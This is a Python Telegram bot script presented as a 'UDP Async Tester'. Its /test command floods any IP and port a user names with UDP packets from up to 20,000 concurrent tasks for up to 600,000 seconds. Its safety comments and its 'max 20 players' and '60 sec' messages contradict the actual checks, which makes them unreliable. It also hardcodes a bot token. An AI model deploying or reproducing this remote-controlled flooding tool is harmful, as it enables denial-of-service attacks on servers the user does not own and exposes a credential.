#!/usr/bin/env python3
import asyncio
import socket
import time
import threading
import telebot
import ipaddress

# ===== CONFIG =====
TOKEN = "8435736634:AAHht4_qXrW16W9pDLNv3Feb8F3nvrK4G5g"
bot = telebot.TeleBot(TOKEN)

active_users = {}

# ===== ASYNC PLAYER =====
async def player_sim(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    sent = 0

    while time.time() < end_time:
        try:
            sock.sendto(b"ping", (ip, port))  # controlled packet
            sent += 1
        except:
            pass

        await asyncio.sleep(0.1)  # slow rate (safe)

    sock.close()
    return sent

# ===== MAIN ASYNC RUN =====
async def run_test(chat_id, ip, port, players, duration):
    tasks = [asyncio.create_task(player_sim(ip, port, duration)) for _ in range(players)]
    results = await asyncio.gather(*tasks)

    total = sum(results)

    bot.send_message(
        chat_id,
        f"✅ Test Finished\n\nTarget: {ip}:{port}\nPlayers: {players}\nPackets: {total}"
    )

    active_users.pop(chat_id, None)

def start_async(chat_id, ip, port, players, duration):
    asyncio.run(run_test(chat_id, ip, port, players, duration))

# ===== COMMANDS =====
@bot.message_handler(commands=['start'])
def start(msg):
    bot.send_message(
        msg.chat.id,
        "🤖 UDP Async Tester\n\n"
        "Use:\n/test <ip> <port> <players> <time>\n\n"
        "Example:\n/test 127.0.0.1 7777 5 10"
    )

@bot.message_handler(commands=['test'])
def test(msg):
    try:
        parts = msg.text.split()

        if len(parts) != 5:
            bot.reply_to(msg, "❌ Usage:\n/test <ip> <port> <players> <time>")
            return

        ip = parts[1]
        port = int(parts[2])
        players = int(parts[3])
        duration = int(parts[4])

        # ===== VALIDATION =====
        try:
            ipaddress.ip_address(ip)
        except:
            bot.reply_to(msg, "❌ Invalid IP")
            return

        if players > 20000:
            bot.reply_to(msg, "⚠️ Max players = 20")
            return

        if duration > 600000:
            bot.reply_to(msg, "⚠️ Max duration = 60 sec")
            return

        if msg.chat.id in active_users:
            bot.reply_to(msg, "⚠️ Test already running")
            return

        bot.send_message(
            msg.chat.id,
            f"🚀 Starting...\n\nTarget: {ip}:{port}\nPlayers: {players}"
        )

        active_users[msg.chat.id] = True

        t = threading.Thread(
            target=start_async,
            args=(msg.chat.id, ip, port, players, duration),
            daemon=True
        )
        t.start()

    except Exception as e:
        bot.reply_to(msg, f"❌ Error: {e}")

# ===== START =====
print("Bot running...")
bot.infinity_polling(skip_pending=True)
